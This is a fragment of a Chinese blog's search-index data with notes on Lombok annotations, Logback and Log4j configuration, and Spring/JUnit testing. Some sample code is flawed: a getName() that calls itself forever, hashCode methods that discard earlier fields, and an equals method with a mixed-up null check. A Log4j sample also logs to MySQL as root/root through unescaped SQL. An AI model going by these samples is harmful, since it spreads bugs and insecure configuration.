<mainClass>org.local.Main</mainClass>\n                    </manifest>\n                </archive>\n            </configuration>\n        </plugin>\n    </plugins>\n</build>\n```\n\n\n\n# ","tags":["Maven"],"categories":["框架|中间件","Maven"]},{"title":"Lombox日常使用记录","url":"/20250619/f1c78c8.html","content":"\n\n\n# 安装插件&项目引入\n\n## Idea里需要安装lombok插件\n\n![78761c9df7b21539df3352c198d274cf.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383492487521.png)  \n\n## pom.xml中引用\n\n```xml\n<dependency>    \n    <groupId>org.projectlombok</groupId>    \n    <artifactId>lombok</artifactId>    \n    <optional>true</optional>  \n</dependency>\n```\n\n# Lombok工作原理分析\n\n会发现在Lombok使用的过程中，只需要添加相应的注解，无需再为此写任何代码。自动生成的代码到底是如何产生的呢？核心之处就是对于注解的解析上。JDK5引入了注解的同时，也提供了两种解析方式。\n\n1. 运行时解析\n\n```\n运行时能够解析的注解，必须将@Retention设置为RUNTIME，这样就可以通过反射拿到该注解。java.lang,reflect反射包中提供了一个接口AnnotatedElement，该接口定义了获取注解信息的几个方法，Class、Constructor、Field、Method、Package等都实现了该接口，对反射熟悉的朋友应该都会很熟悉这种解析方式。\n```\n\n2. 编译时解析\n   编译时解析有两种机制，分别简单描述下：\n   - Annotation Processing Tool\n     apt自JDK5产生，JDK7已标记为过期，不推荐使用，JDK8中已彻底删除，自JDK6开始，可以使用Pluggable Annotation Processing API来替换它，apt被替换主要有2点原因：\n     1. api都在com.sun.mirror非标准包下\n     2. 没有集成到javac中，需要额外运行\n   - Pluggable Annotation Processing API\n     JSR 269自JDK6加入，作为apt的替代方案，它解决了apt的两个问题，javac在执行的时候会调用实现了该API的程序，这样我们就可以对编译器做一些增强\n\n```\nLombok本质上就是一个实现了“JSR 269 API”的程序。在使用javac的过程中，它产生作用的具体流程如下：\n1. javac对源代码进行分析，生成了一棵抽象语法树（AST）\n\n2. 运行过程中调用实现了“JSR 269 API”的Lombok程序\n此时Lombok就对第一步骤得到的AST进行处理，找到@Data注解所在类对应的语法树（AST），然后修改该语法树（AST），增加getter和setter方法定义的相应树节点\n\n3. javac使用修改后的抽象语法树（AST）生成字节码文件，即给class增加新的节点（代码块）\n```\n\n# Lombok的优缺点\n\n```\n优点：\n1. 能通过注解的形式自动生成构造器、getter/setter、equals、hashcode、toString等方法，提高了一定的开发效率\n2. 让代码变得简洁，不用过多的去关注相应的方法\n3. 属性做修改时，也简化了维护为这些属性所生成的getter/setter方法等\n \n缺点：\n1. 不支持多种参数构造器的重载\n2. 虽然省去了手动创建getter/setter方法的麻烦，但大大降低了源代码的可读性和完整性，降低了阅读源代码的舒适度\n```\n\n# 注解\n\n## @Slf4j\n\n```\n注解在类上；为类提供一个 属性名为log 的 log4j 日志对像\n```\n\n## @Data\n\n```\n@Data注解在类上，会为类的所有属性自动生成setter/getter、equals、canEqual、hashCode、toString方法，如为final属性，则不会为该属性生成setter方法。\n```\n\n官方实例如下\n\n```java\nimport lombok.AccessLevel;\nimport lombok.Data;\nimport lombok.Setter;\nimport lombok.ToString;\n\n@Data\npublic class DataExample {\n\n  private final String name;\n\n  @Setter(AccessLevel.PACKAGE)\n  private int age;\n\n  private double score;\n  private String[] tags;\n\n  @ToString(includeFieldNames = true)\n  @Data(staticConstructor = \"of\")\n  public static class Exercise<T> {\n\n    private final String name;\n    private final T value;\n  }\n}\n```\n\n如不使用Lombok，则实现如下\n\n```java\nimport java.util.Arrays;\n\npublic class DataExample {\n    private final String name;\n    private int age;\n    private double score;\n\n    private String[] tags;\n\n    public DataExample(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return this.name;\n    }\n\n    void setAge(int age) {\n        this.age = age;\n    }\n\n    public int getAge() {\n        return this.age;\n    }\n\n    public void setScore(double score) {\n        this.score = score;\n    }\n\n    public double getScore() {\n        return this.score;\n    }\n\n    public String[] getTags() {\n        return this.tags;\n    }\n\n    public void setTags(String[] tags) {\n        this.tags = tags;\n    }\n\n    @Override\n    public String toString() {\n        return \"DataExample(\" + this.getName() + \", \" + this.getAge() + \", \" + this.getScore() + \", \" + Arrays.deepToString(this.getTags());\n    }\n\n    protected boolean canEqual(Object other) {\n        return other instanceof DataExample;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (o == this) return true;\n        if (!(o instanceof DataExample)) return false;\n        DataExample other = (DataExample) o;\n        if (!other.canEqual((Object) this)) return false;\n        if (this.getName() == null ? other.getName() != null : !this.getName().equals(other.getName())) return false;\n        if (this.getAge() != other.getAge()) return false;\n        if (Double.compare(this.getScore(), other.getScore()) != 0) return false;\n        if (!Arrays.deepEquals(this.getTags(), other.getTags())) return false;\n        return true;\n    }\n\n    @Override\n    public int hashCode() {\n        final int PRIME = 59;\n        int result = 1;\n        final long temp1 = Double.doubleToLongBits(this.getScore());\n        result = (this.getName() == null ? 43 : this.getName().hashCode());\n        result = this.getAge();\n        result = (int) (temp1 ^ (temp1 >>> 32));\n        result = Arrays.deepHashCode(this.getTags());\n        return result;\n    }\n\n    public static class Exercise<T> {\n        private final String name;\n        private final T value;\n\n        private Exercise(String name, T value) {\n            this.name = name;\n            this.value = value;\n        }\n\n        public static <T> Exercise<T> of(String name, T value) {\n            return new Exercise<T>(name, value);\n        }\n\n        public String getName() {\n            return this.name;\n        }\n\n        public T getValue() {\n            return this.value;\n        }\n\n        @Override\n        public String toString() {\n            return \"Exercise(name=\" + this.getName() + \", value=\" + this.getValue() + \")\";\n        }\n\n        protected boolean canEqual(Object other) {\n            return other instanceof Exercise;\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            if (o == this) return true;\n            if (!(o instanceof Exercise)) return false;\n            Exercise<?> other = (Exercise<?>) o;\n            if (!other.canEqual((Object) this)) return false;\n            if (this.getName() == null ? other.getValue() != null : !this.getName().equals(other.getName()))\n                return false;\n            if (this.getValue() == null ? other.getValue() != null : !this.getValue().equals(other.getValue()))\n                return false;\n            return true;\n        }\n\n        @Override\n        public int hashCode() {\n            final int PRIME = 59;\n            int result = 1;\n            result = (this.getName() == null ? 43 : this.getName().hashCode());\n            result = (this.getValue() == null ? 43 : this.getValue().hashCode());\n            return result;\n        }\n    }\n}\n```\n\n## @Getter/@Setter\n\n如果觉得``@Data``太过残暴（因为``@Data``集合了``@ToString``、``@EqualsAndHashCode``、``@Getter/@Setter``、``@RequiredArgsConstructor``的所有特性）`` ``不够精细，可以使用``@Getter/@Setter``注解，此注解在属性上，可以为相应的属性自动生成``Getter/Setter``方法，示例如下：\n\n```java\nimport lombok.AccessLevel;\nimport lombok.Getter;\nimport lombok.Setter;\n\npublic class GetterSetterExample {\n\n  @Getter\n  @Setter\n  private int age = 10;\n\n  @Setter(AccessLevel.PROTECTED)\n  private String name;\n\n  @Override\n  public String toString() {\n    return String.format(\"%s (age: %d)\", name, age);\n  }\n}\n```\n\n如果不使用Lombok：\n\n```java\npublic class GetterSetterExample {\n\n  private int age = 10;\n  private String name;\n\n  @Override\n  public String toString() {\n    return String.format(\"%s (age: %d)\", name, age);\n  }\n\n  public int getAge() {\n    return age;\n  }\n\n  public void setAge(int age) {\n    this.age = age;\n  }\n\n  protected void setName(String name) {\n    this.name = name;\n  }\n}\n```\n\n## @NonNull\n\n该注解用在属性或构造器上，Lombok会生成一个非空的声明，可用于校验参数，能帮助避免空指针。**主要作用于成员变量和参数中，标识不能为空，否则抛出空指针异常**。 示例如下：\n\n```java\nimport lombok.NonNull;\n\npublic class NonNullExample extends Something {\n\n  private String name;\n\n  public NonNullExample(@NonNull Person person) {\n    super(\"Hello\");\n    this.name = person.getName();\n  }\n}\n```\n\n不使用Lombok\n\n```java\nimport lombok.NonNull;\n\npublic class NonNullExample extends Something {\n\n  private String name;\n\n  public NonNullExample(@NonNull Person person) {\n    super(\"Hello\");\n    if (person == null) {\n      throw new NullPointerException(\"person\");\n    }\n    this.name = person.getName();\n  }\n}\n```\n\n## @Cleanup\n\n@Cleanup：自动关闭资源，针对实现了**java.io.Closeable**接口的对象有效，如：典型的**IO流对象**\n 示例如下：\n\n```java\nimport java.io.*;\nimport lombok.Cleanup;\n\npublic class CleanupExample {\n  public static void main(String[] args) throws IOException {\n    @Cleanup\n    InputStream in = new FileInputStream(args[0]);\n    @Cleanup\n    OutputStream out = new FileOutputStream(args[1]);\n    byte[] b = new byte[10000];\n    while (true) {\n      int r = in.read(b);\n      if (r == -1) break;\n      out.write(b, 0, r);\n    }\n  }\n}\n```\n\n如不使用Lombok，则需如下：\n\n```java\nimport java.io.*;\n\npublic class CleanupExample {\n\n  public static void main(String[] args) throws IOException {\n    InputStream in = new FileInputStream(args[0]);\n    try {\n      OutputStream out = new FileOutputStream(args[1]);\n      try {\n        byte[] b = new byte[10000];\n        while (true) {\n          int r = in.read(b);\n          if (r == -1) break;\n          out.write(b, 0, r);\n        }\n      } finally {\n        if (out != null) {\n          out.close();\n        }\n      }\n    } finally {\n      if (in != null) {\n        in.close();\n      }\n    }\n  }\n}\n```\n\n## @EqualsAndHashCodes\n\n​\t\t默认情况下，会使用所有非静态（non-static）和非瞬态（non-transient）属性来生成equals和hasCode，也能通过exclude注解来排除一些属性。**作用于类，覆盖默认的equals和hashCode**\n示例如下\n\n```java\nimport lombok.EqualsAndHashCode;\n\n@EqualsAndHashCode(exclude = { \"id\", \"shape\" })\npublic class EqualsAndHashCodeExample {\n\n  private transient int transientVar = 10;\n  private String name;\n  private double score;\n  private Shape shape = new Square(5, 10);\n  private String[] tags;\n  private int id;\n\n  public String getName() {\n    return this.name;\n  }\n\n  @EqualsAndHashCode(callSuper = true)\n  public static class Square extends Shape {\n\n    private final int width, height;\n\n    public Square(int width, int height) {\n      this.width = width;\n      this.height = height;\n    }\n  }\n}\n```\n\n## @ToString\n\n类使用@ToString注解，Lombok会生成一个toString()方法，默认情况下，会输出类名、所有属性（会按照属性定义顺序），用逗号来分割。\n 通过将includeFieldNames参数设为true，就能明确的输出toString()属性。这一点是不是有点绕口，通过代码来看会更清晰些。\n\n使用Lombok的示例：\n\n```java\nimport lombok.ToString;\n\n@ToString(exclude = \"id\")\npublic class ToStringExample {\n\n  private static final int STATIC_VAR = 10;\n  private String name;\n  private Shape shape = new Square(5, 10);\n  private String[] tags;\n  private int id;\n\n  public String getName() {\n    return this.getName();\n  }\n\n  @ToString(callSuper = true, includeFieldNames = true)\n  public static class Square extends Shape {\n\n    private final int width, height;\n\n    public Square(int width, int height) {\n      this.width = width;\n      this.height = height;\n    }\n  }\n}\n```\n\n\n\n不使用Lombok的示例如下\n\n```java\npackage com.hots;\n\nimport java.util.Arrays;\n\npublic class ToStringExample {\n    private static final int STATIC_VAR = 10;\n    private String name;\n    private Shape shape = new Square(5, 10);\n    private String[] tags;\n    private int id;\n\n    public String getName() {\n        return this.getName();\n    }\n\n    public static class Square extends Shape {\n        private final int width, height;\n\n        public Square(int width, int height) {\n            this.width = width;\n            this.height = height;\n        }\n\n        @Override\n        public String toString() {\n            return \"Square(super=\" + super.toString() + \", width=\" + this.width + \", height=\" + this.height + \")\";\n        }\n    }\n\n    @Override\n    public String toString() {\n        return \"ToStringExample(\" + this.getName() + \", \" + this.shape + \", \" + Arrays.deepToString(this.tags) + \")\";\n    }\n}\n\n```\n\n\n\n## @NoArgsConstructor、@RequiredArgsConstructor、@AllArgsConstructor\n\n无参构造器、部分参数构造器、全参构造器。作用于类上，用于生成构造函数。有staticName、access等属性。staticName属性一旦设定，将采用静态方法的方式生成实例，access属性可以限定访问权限。\n\n```java\n@NoArgsConstructor：生成无参构造器；\n@RequiredArgsConstructor：生成包含final和@NonNull注解的成员变量的构造器；\n@AllArgsConstructor：生成全参构造器\n```\n\nLombok没法实现多种参数构造器的重载。\n Lombok示例代码如下：\n\n```java\nimport lombok.AccessLevel;\nimport lombok.AllArgsConstructor;\nimport lombok.NonNull;\nimport lombok.RequiredArgsConstructor;\n\n@RequiredArgsConstructor(staticName = \"of\")\n@AllArgsConstructor(access = AccessLevel.PROTECTED)\npublic class ConstructorExample<T> {\n\n  private int x, y;\n\n  @NonNull\n  private T description;\n\n  @NoArgsConstructor\n  public static class NoArgsExample {\n\n    @NonNull\n    private String field;\n  }\n}\n\n```\n\n不使用Lombok的示例如下\n\n```java\npublic class ConstructorExample<T> {\n\n  private int x, y;\n\n  @NonNull\n  private T description;\n\n  private ConstructorExample(T description) {\n    if (description == null) throw new NullPointerException(\"description\");\n    this.description = description;\n  }\n\n  public static <T> ConstructorExample<T> of(T description) {\n    return new ConstructorExample<T>(description);\n  }\n\n  @java.beans.ConstructorProperties({ \"x\", \"y\", \"description\" })\n  protected ConstructorExample(int x, int y, T description) {\n    if (description == null) throw new NullPointerException(\"description\");\n    this.x = x;\n    this.y = y;\n    this.description = description;\n  }\n\n  public static class NoArgsExampmle {\n\n    @NonNull\n    private String field;\n\n    public NoArgsExample() {}\n  }\n}\n\n```\n\n## @Log\n\n作用于类上，生成日志变量。针对不同的日志实现产品，有不同的注解","tags":["Lombox"],"categories":["框架|中间件","Lombox"]},{"title":"Logback日常使用记录","url":"/20250619/4b5ef04d.html","content":"\n# Logback 配置Demo\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration> \n  <appender name=\"consoleLog\" class=\"ch.qos.logback.core.ConsoleAppender\"> \n    <layout class=\"ch.qos.logback.classic.PatternLayout\"> \n      <pattern>%d - %msg%n</pattern> \n    </layout> \n  </appender>  \n  <appender name=\"fileInfoLog\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"> \n    <filter class=\"ch.qos.logback.classic.filter.LevelFilter\"> \n      <level>ERROR</level>  \n      <onMatch>DENY</onMatch>  \n      <onMismatch>ACCEPT</onMismatch> \n    </filter>  \n    <encoder> \n      <pattern>%d - %msg%n</pattern> \n    </encoder>  \n    <rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"> \n      <fileNamePattern>C:\\Users\\hots_\\Downloads\\info.%d.log</fileNamePattern> \n    </rollingPolicy> \n  </appender>  \n  <appender name=\"fileErrorLog\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"> \n    <filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"> \n      <level>ERROR</level> \n    </filter>  \n    <encoder> \n      <pattern>%d - %msg%n</pattern> \n    </encoder>  \n    <rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"> \n      <fileNamePattern>C:\\Users\\hots_\\Downloads\\error.%d.log</fileNamePattern> \n    </rollingPolicy> \n  </appender>  \n  <root level=\"info\"> \n    <appender-ref ref=\"consoleLog\"/>  \n    <appender-ref ref=\"fileInfoLog\"/>  \n    <appender-ref ref=\"fileErrorLog\"/> \n  </root> \n</configuration>\n```\n\n\n\n ","tags":["Logback"],"categories":["框架|中间件","Logback"]},{"title":"Log4j日常使用记录","url":"/20250619/14631848.html","content":"\n# log4j.properties 配置说明\n\n```properties\nlog4J 日志信息log4j.properties配置说明\n##logger是进行记录的主要类，appender是记录的方式,layout是记录的格式\n#Logger 日志写出器，供程序员输出日志信息\n#Appender 日志目的地，把格式化好的日志信息输出到指定的地方去\n#ConsoleAppender 目的地为控制台的Appender\n#FileAppender 目的地为文件的Appender\n#RollingFileAppender 目的地为大小受限的文件的Appender\n#Layout 日志格式化器，用来把程序员的logging request格式化成字符串\n#PatternLayout 用指定的pattern格式化logging request的Layou\n#Log4j提供的appender有以下几种：\n#　　org.apache.log4j.ConsoleAppender（控制台），\n#　　org.apache.log4j.FileAppender（文件），\n#　　org.apache.log4j.DailyRollingFileAppender（每天产生一个日志文件），\n#　　org.apache.log4j.RollingFileAppender（文件大小到达指定尺寸的时候产生一个新的文件），\n#　　org.apache.log4j.WriterAppender（将日志信息以流格式发送到任意指定的地方）\n#Log4j提供的layout有以下几种：\n#　　org.apache.log4j.HTMLLayout（以HTML表格形式布局），\n#　　org.apache.log4j.PatternLayout（可以灵活地指定布局模式），\n#　　org.apache.log4j.SimpleLayout（包含日志信息的级别和信息字符串），\n#　　org.apache.log4j.TTCCLayout（包含日志产生的时间、线程、类别等等信息）\n#Log4J采用类似C语言中的printf函数的打印格式格式化日志信息，打印参数如下\n# %m 输出代码中指定的消息\n# %M 输出日志发生的方法名\n#　　%p 输出优先级，即DEBUG，INFO，WARN，ERROR，FATAL\n#　　%r 输出自应用启动到输出该log信息耗费的毫秒数\n#　　%c 输出所属的类目，通常就是所在类的全名\n#　　%t 输出产生该日志事件的线程名\n#　　%n 输出一个回车换行符，Windows平台为“rn”，Unix平台为“n”\n#　　%d 输出日志时间点的日期或时间，默认格式为ISO8601，也可以在其后指定格式，比如：%d{yyyy MMM dd HH:mm:ss,SSS}，输出类似：2002年10月18日 22：10：28，921\n#　　%l 输出日志事件的发生位置，包括类目名、发生的线程，以及在代码中的行数。举例：Testlog4.main(TestLog4.java:10)\n# %L 输出日志发生的位置\n# %F 输出类名\n#####################################################################\n#设置级别和目的地 -- 把日志等级为debug的日志信息输出到stdout和SYS,QUERY这三个目的地\nlog4j.rootLogger=debug,STDOUT\n# stdout:目的地 -- 打印到屏幕\n## org.apache.log4j.ConsoleAppender:控制台\nlog4j.appender.STDOUT=org.apache.log4j.ConsoleAppender\n## org.apache.log4j.PatternLayout:灵活地指定布局模式\nlog4j.appender.STDOUT.layout=org.apache.log4j.PatternLayout\n## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%c-%M] %m%n [%-5p][%d{HH:mm:ss}][%l] %m%n\nlog4j.appender.STDOUT.layout.ConversionPattern=[%-5p][%d{yyyy-MM-dd HH:mm:ss sss}][%t][%c-%M][%L](%F:%L) - %m%n\n\n# QUERY:目的地 -- 输出到文件(限定每个文件大小)\n## 凡是 info、warn、error、fatal 级别的数据都会在这里执行输出到 query.log 日志文件中\n##log4j.logger.QUERY=INFO,QUERY\nlog4j.logger.QUERY=INFO\n##输出到文件(这里默认为追加方式)，使用org.apache.log4j.FileAppender：日志会在一个文件中追加\nlog4j.appender.QUERY=org.apache.log4j.RollingFileAppender\n##设置文件输出路径;html:log/query.html\nlog4j.appender.QUERY.File=log/query.log\n##设置文件输出样式;html格式： org.apache.log4j.HTMLLayout\nlog4j.appender.QUERY.layout=org.apache.log4j.PatternLayout\n## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%n\nlog4j.appender.QUERY.layout.ConversionPattern=[%-5p][%d{yyyy-MM-dd HH:mm:ss}][%c-%M] %m%n\n## 指定文件的最大 大小\nlog4j.appender.QUERY.MaxFileSize=2048KB\n## 可被备份的日志数\nlog4j.appender.QUERY.MaxBackupIndex=100\n\n# SYS:目的地 -- 输出到文件(每天产生一个文件)\n## 凡是 error、fatal 级别的数据都会在这里执行输出到 sys.log 日志文件中\n#log4j.logger.SYS=error,SYS\nlog4j.logger.SYS=error\n## org.apache.log4j.RollingFileAppender:每天产生一个日志文件\n#使用org.apache.log4j.FileAppender：日志会在一个文件中追加\nlog4j.appender.SYS=org.apache.log4j.DailyRollingFileAppender\n##设置文件输出路径 ${user.home}/log/sys.log\nlog4j.appender.SYS.File=log/sys.log\n## org.apache.log4j.PatternLayout:灵活地指定布局模式\nlog4j.appender.SYS.layout=org.apache.log4j.PatternLayout\n## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%n\nlog4j.appender.SYS.layout.ConversionPattern=[%-5p][%d{HH:mm:ss}][%C-%M] %m%n\n#设置特定包的级别\n## 把com.swh.weixin包下的日志内容显示级别为debug,和目的地\n## 把com.swh.weixin.util包下日志等级为debug的信息输出到pack 目的地\n#log4j.logger.com.swh.weixin.util=debug,pack\n##输出到文件(这里默认为追加方式)，使用org.apache.log4j.FileAppender：日志会在一个文件中追加\nlog4j.appender.pack=org.apache.log4j.RollingFileAppender\n##设置文件输出路径 或者 ${user.home}/log/pack.log\nlog4j.appender.pack.File=log/pack.log\n##设置文件输出样式\nlog4j.appender.pack.layout=org.apache.log4j.PatternLayout\n## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%n\nlog4j.appender.pack.layout.ConversionPattern=[%-5p][%d{yyyy MM dd HH:mm:ss}][%c-%M] %m%n\n## 指定文件的最大 大小\nlog4j.appender.pack.MaxFileSize=1024KB\n#日志最大备份数目\nlog4j.appender.pack.MaxBackupIndex=100\n########################################################################\n##设置级别和目的地\n#log4j.rootLogger=debug,appender1,appender2\n##只设置特定包的级别和目的地\n#log4j.logger.com.coderdream=debug,appender1\n#log4j.logger.com.coderdream.Dao=info,appender1,appender2\n##输出到控制台\n#log4j.appender.appender1=org.apache.log4j.ConsoleAppender\n##设置输出样式\n#log4j.appender.appender1.layout=org.apache.log4j.PatternLayout\n##自定义样式\n## %r 时间 0\n## %t 方法名 main\n## %p 优先级 DEBUG/INFO/ERROR\n## %c 所属类的全名(包括包名)\n## %l 发生的位置，在某个类的某行\n## %m 输出代码中指定的讯息，如log(message)中的message\n## %n 输出一个换行符号\n#log4j.appender.appender1.layout.ConversionPattern=[%d{yy/MM/dd HH:mm:ss:SSS}][%C-%M] %m%n\n##输出到文件(这里默认为追加方式)\n#log4j.appender.appender2=org.apache.log4j.FileAppender\n##设置文件输出路径\n##【1】文本文件\n#log4j.appender.appender2.File=c:/Log4JCRM_Dao.log\n##设置文件输出样式\n#log4j.appender.appender2.layout=org.apache.log4j.PatternLayout\n#log4j.appender.appender2.layout.ConversionPattern=[%d{HH:mm:ss:SSS}][%C-%M] -%m%n\n##把日志文件写入数据库\n##########################日志输出到远程数据库########################################\n##把日志文件写入数据库\n##记录的日志级别\nlog4j.logger.db=info\n##日志输出到数据库\nlog4j.appender.db = org.apache.log4j.jdbc.JDBCAppender\n##缓存\nlog4j.appender.db.BufferSize = 0\n##数据库驱动\nlog4j.appender.db.Driver = com.mysql.jdbc.Driver\n##数据url地址 ，本地可简写：jdbc:mysql:///test\nlog4j.appender.db.URL = jdbc:mysql://localhost:3306/swh_hibernate4?useUnicode=true&characterEncoding=utf8\n##数据库用户名\nlog4j.appender.db.User = root\n##数据库密码\nlog4j.appender.db.Password = root\n##日志布局模式\nlog4j.appender.db.layout = org.apache.log4j.PatternLayout\n##日志插入数据库中，t_logs 表字段可自定义\nlog4j.appender.db.layout.ConversionPattern = INSERT INTO t_logs(createDate, thread, priority, category,<br /> methodName, message) values('%d', '%t', '%-5p', '%c','%M', '[%l]-%m')\n```\n\n# 打印SQL语句\n\n```properties\nlog4j.logger.java.sql.Connection=DEBUG\nlog4j.logger.java.sql.Statement=DEBUG\nlog4j.logger.java.sql.PreparedStatement=DEBUG\nlog4j.logger.java.sql.ResultSet=DEBUG\n```\n\n","tags":["Log4j"],"categories":["框架|中间件","Log4j"]},{"title":"Junit日常使用记录","url":"/20250619/99356519.html","content":"\n# 使用Spring配合Junit进行单元测试的总结\n\n##  jar包导入\n\n```xml\n<dependency>\n     <groupId>org.springframework</groupId>\n     <artifactId>spring-test</artifactId>\n     <version>3.2.4.RELEASE</version>\n     <scope>test</scope>\n</dependency>\n```\n\n\n\n##  直接对spring中注入的bean进行测试(以DAO为例)\n\n在测试类上添加\n\n ```java\n@RunWith 注解指定使用springJunit的测试运行器\n@ContextConfiguration 注解指定测试用的spring配置文件的位置\n ```\n\n 之后我们就可以注入我们需要测试的bean进行测试。Junit在运行测试之前会先解析spring的配置文件,初始化spring中配置的bean\n\n```java\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(locations = { \"classpath*:spring-config-test.xml\" })\npublic class TestProjectDao {\n\n  @Autowired\n  ProjectDao projectDao;\n\n  @Test\n  public void testCreateProjectCode() {\n    long applyTime = System.currentTimeMillis();\n    Timestamp ts = new Timestamp(applyTime);\n    Map codeMap = projectDao.generateCode(\"5\", \"8\", ts, \"院内\");\n    String projectCode = (String) codeMap.get(\"_project_code\");\n    Timestamp apply_time = (Timestamp) codeMap.get(\"_apply_time\");\n    System.out.print(projectCode);\n    System.out.print(apply_time.toString());\n    Assert.assertTrue(projectCode.length() == 12);\n  }\n}\n```\n\n##  对SpringMVC进行测试\n\nSpring3.2之后出现了org.springframework.test.web.servlet.MockMvc 类,对springMVC单元测试进行支持。样例如下：\n\n```java\npackage com.jiaoyiping.baseproject;\n\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;\n\nimport com.jiaoyiping.baseproject.privilege.controller.MeunController;\nimport com.jiaoyiping.baseproject.training.bean.Person;\nimport junit.framework.Assert;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.MediaType;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\nimport org.springframework.test.context.web.WebAppConfiguration;\nimport org.springframework.test.web.servlet.MockMvc;\nimport org.springframework.test.web.servlet.ResultActions;\nimport org.springframework.test.web.servlet.setup.MockMvcBuilders;\nimport org.springframework.web.servlet.ModelAndView;\n\n@RunWith(SpringJUnit4ClassRunner.class)\n@WebAppConfiguration\n//@ContextConfiguration(classes = {WebMvcConfig.class, MockDataConfig.class})\n@ContextConfiguration(\n  locations = {\n    \"classpath:/spring/applicationContext.xml\",\n    \"classpath*:mvc-dispatcher-servlet.xml\",\n  }\n)\npublic class TestMockMvc {\n\n  @Autowired\n  private org.springframework.web.context.WebApplicationContext context;\n\n  MockMvc mockMvc;\n\n  @Before\n  public void before() {\n    //可以对所有的controller来进行测试\n    mockMvc = MockMvcBuilders.webAppContextSetup(context).build();\n    //仅仅对单个Controller来进行测试\n    // mockMvc = MockMvcBuilders.standaloneSetup(new MeunController()).build();\n  }\n\n  @Test\n  public void testGetMenu() {\n    try {\n      System.out.println(\"----------------------------\");\n      ResultActions actions = this.mockMvc.perform(get(\"/menu/manage.action\"));\n      System.out.println(status());\n      // System.out.println(content().toString());\n      actions.andExpect(status().isOk());\n      // actions.andExpect(content().contentType(\"text/html\"));\n      System.out.println(\"----------------------------\");\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n  }\n\n  //从controller里直接增加用户(用POST的方式)\n  //post(\"路径\").param(\"属性名\",\"属性值\"); 用这种方法来构造POST\n  @Test\n  public void addPerson() {\n    try {\n      ResultActions resultActions =\n        this.mockMvc.perform(\n            post(\"/person/add\")\n              .param(\"name\", \"用友软件\")\n              .param(\"age\", \"23\")\n              .param(\"address\", \"北京市永丰屯\")\n          );\n      resultActions.andExpect(status().isOk());\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n  }\n\n  //得到Controller层返回的ModelAndView的方法：resultActions.andReturn().getModelAndView().getModel().get(\"person\");\n  @Test\n  public void getPerson() {\n    String id = \"297e5fb648b0e6d30148b0e6da6d0000\";\n    try {\n      ResultActions resultActions =\n        this.mockMvc.perform(post(\"/person/toEditPerson\").param(\"id\", id))\n          .andExpect(status().isOk());\n      Person person = (Person) (\n        resultActions.andReturn().getModelAndView().getModel().get(\"person\")\n      );\n      Assert.assertEquals(23, person.getAge());\n      System.out.println(person.getId());\n      System.out.println(person.getName());\n      System.out.println(person.getAge());\n      System.out.println(person.getAddress());\n      Assert.assertEquals(23, person.getAge());\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n  }\n}\n```\n\n##  测试RestEasy提供的接口(当使用restEasy提供的rest类型接口的时候会用到)\n\nRestEasy提供了 org.jboss.resteasy.core.Dispatcher类来模拟http请求，并返回数据。这样,在测试接口的时候就不必启动容器了\n代码如下\n\n```java\npackage cn.cmri.pds.controller;\n\nimport cn.cmri.pds.project.controllor.ProjectTagControllor;\nimport cn.cmri.pds.project.service.ProjectTagService;\nimport java.net.URISyntaxException;\nimport javax.servlet.http.HttpServletResponse;\nimport org.jboss.resteasy.core.Dispatcher;\nimport org.jboss.resteasy.mock.MockDispatcherFactory;\nimport org.jboss.resteasy.mock.MockHttpRequest;\nimport org.jboss.resteasy.mock.MockHttpResponse;\nimport org.junit.Assert;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\n\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(locations = { \"classpath*:spring-config-test.xml\" })\npublic class TestProjectTagController {\n\n  @Autowired\n  ProjectTagService projectTagService;\n\n  Dispatcher dispatcher;\n\n  @Before\n  public void before() {\n    ProjectTagControllor projectTagControllor = new ProjectTagControllor();\n    projectTagControllor.setProjectTagService(projectTagService);\n    dispatcher = MockDispatcherFactory.createDispatcher();\n    dispatcher.getRegistry().addSingletonResource(projectTagControllor);\n  }\n\n  @Test\n  public void testProjectTags() throws URISyntaxException {\n    MockHttpRequest request = MockHttpRequest.get(\"/rest/project/123456/tags\");\n    MockHttpResponse response = new MockHttpResponse();\n    dispatcher.invoke(request, response);\n    Assert.assertEquals(HttpServletResponse.SC_NOT_FOUND, response.getStatus());\n    Assert.assertEquals(\"指定的项目不存在\", response.getContentAsString());\n  }\n}\n```\n\n","tags":["Junit"],"categories":["框架|中间件","Junit"]},{"title":"2023年问题记录","url":"/20250619/65e80ab3.html","content":"\n# response.sendRedirect丢失请求地址的HTTPS协议\n\n- 问题描述：\n\n  `response.sendRedirect` 默认采用的HTTP协议GET请求，导致在重定向之后，原先的HTTPS请求变为HTTP请求\n\n- 解决\n\n  1. 在响应信息中设置`HTTP状态码`和`location`头信息\n\n     